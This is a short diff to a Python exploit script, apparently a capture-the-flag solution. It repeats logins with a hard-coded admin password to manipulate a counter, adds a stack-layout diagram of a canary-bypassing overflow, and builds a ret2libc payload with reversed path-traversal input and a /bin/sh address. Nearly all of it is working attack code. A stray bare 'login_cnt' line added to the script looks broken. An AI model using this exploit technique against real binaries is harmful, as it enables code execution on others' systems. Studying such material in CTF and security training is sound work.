@@ -40,8 +40,24 @@ system = libc_base + 0x3a940
 binsh = libc_base + 0x15902b
 
 for i in range(0x2e):
-	login("admin", "P3ssw0rd")
+	login("admin", "P3ssw0rd") # login cnt=0x2f now!
 
+'''
+============ <= stack of main
+...
+login_cnt    <= copy payload.reverse() until ret, before canary.
+...
+============ <= stack of menu 8
+...
+ret
+...
+canary
+...
+============ <= stack of downloadURL
+...
+'''
+
+login_cnt
 payload = "aa/../../cccccccc" # reverse input
 payload += p32(binsh)[::-1]
 payload += "AAAA"
